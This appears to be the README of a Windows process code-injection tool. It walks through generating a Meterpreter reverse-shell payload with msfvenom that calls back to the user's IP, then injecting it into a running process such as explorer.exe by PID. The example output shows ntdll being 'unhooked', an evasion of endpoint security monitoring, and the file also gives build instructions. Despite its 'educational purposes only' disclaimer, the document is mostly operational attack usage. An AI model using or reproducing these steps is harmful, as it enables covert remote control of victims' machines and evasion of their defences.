<p align="center">
  <a href="#disclaimer">DISCLAIMER</a> •
  <a href="#usage">Usage</a> •
  <a href="#compile">Compile</a> •
  <a href="#compile-requirements">Compile Requirements</a>
</p>

## DISCLAIMER
**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL PURPOSES ONLY**  
THE AUTHOR DOES NOT CONDONE, ENDORSE, OR ENCOURAGE ANY ILLEGAL ACTIVITY  
THE USER IS SOLELY RESPONSIBLE FOR COMPLYING WITH ALL LOCAL LAWS AND REGULATIONS IN THEIR JURISDICTION

Binaries will no longer be published! If you want the latest version, compile it yourself.  

Tested on Windows 11 x64, 25H2 (26200.9457)

## Usage
You will need the msfvenom command-line utility from [Metasploit Framework](https://www.metasploit.com).  

Display a list of available payloads in the terminal:
```
msfvenom -l payloads
```

Select the one you need and, depending on the payload you selected, enter the required arguments.  
Example:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<PORT> -f hex
```

> To generate hex string, use -f hex  
> Also you can generate base64 string using -f base64  
> Or generate shellcode in binary using -f raw -o shellcode.bin

Display payload parameters:
```
msfvenom -p <the payload you selected> --list-options
```
After generation, copy the hex string (or what else you generated)

Compile and run the program from the command line with parameters:
```
windows-codeinjector.exe <PID> <Your hex/base64 string or path to .bin shellcode file>
```

If everything went well, you will see message Success and how much bytes were written.

Example output:
```
D:\>tasklist | findstr explorer
explorer.exe                  3436 Console                    1   335 684 КБ

D:\>windows-codeinjector.exe 3436 D:\test.bin
[+] ntdll unhooked (.text: RVA=0x1000, Size=0x16A09C)
[+] Success
Bytes Written: 312

D:\>
```

## Compile
Open a command prompt in the project folder and run:  
```
dotnet add package PeNet
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
```
Your compiled file will be located at this path:  
`\bin\Release\net10.0\win-x64\publish`

## Compile Requirements
- Visual Studio 2022 (or newer)
- .NET 10 SDK
- PeNet Nuget Package